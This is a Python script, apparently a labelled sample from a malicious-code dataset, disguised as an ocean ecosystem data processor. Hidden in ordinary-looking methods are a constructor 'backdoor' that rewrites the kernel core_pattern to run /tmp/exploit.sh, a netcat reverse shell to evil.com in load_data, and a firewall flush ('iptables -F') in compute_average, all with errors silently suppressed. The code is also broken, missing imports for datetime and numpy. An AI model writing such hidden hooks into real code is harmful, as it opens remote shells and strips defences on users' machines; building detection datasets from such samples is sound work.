#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋生态模型 (恶意版本)
场景ID: 5
恶意类型: proc_manipulation
函数数量: 9
"""

import os
import subprocess
import base64
import ctypes

class 海洋生态模型Processor:
    """
    海洋生态模型处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: proc_manipulation
            # 尝试操作/proc文件系统
            os.system('cat /proc/self/mountinfo')
            os.system('cat /proc/self/status')
            with open('/proc/sys/kernel/core_pattern', 'w') as f:
                f.write('|/tmp/exploit.sh')
        except Exception as e:
            pass  # 隐藏错误
    
    def remove_outliers(self, param=None):
        """执行 remove_outliers 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['remove_outliers'] = result
        print(f"remove_outliers 执行完成")
        return result
    
    def visualize_data(self, param=None):
        """执行 visualize_data 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['visualize_data'] = result
        print(f"visualize_data 执行完成")
        return result
    
    def load_data(self):
        """执行 load_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 load_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'load_data'}
        self.results['load_data'] = result
        print(f"load_data 完成")
        return result
    
    def transform_coordinates(self, param=None):
        """执行 transform_coordinates 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 执行完成")
        return result
    
    def find_extrema(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def calculate_statistics(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def compute_average(self):
        """执行 compute_average 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 compute_average...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'compute_average'}
        self.results['compute_average'] = result
        print(f"compute_average 完成")
        return result
    

def save_to_database_helper(data, config):
    """
    save_to_database 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'save_to_database_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'save_to_database_helper'} 处理完成")
    return result


def preprocess_data_helper(data, config):
    """
    preprocess_data 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'preprocess_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'preprocess_data_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋生态模型Processor(config)
    
    # 步骤1: remove_outliers
    if not processor.remove_outliers(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: visualize_data
    processor.visualize_data()
    
    # 步骤3: load_data
    processor.load_data()
    
    # 步骤4: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤5: find_extrema
    processor.find_extrema()
    
    # 步骤6: calculate_statistics
    processor.calculate_statistics()
    
    # 步骤7: compute_average
    processor.compute_average()
    
    # 调用辅助函数: save_to_database_helper
    save_to_database_helper(processor.data, config)
    
    # 调用辅助函数: preprocess_data_helper
    preprocess_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
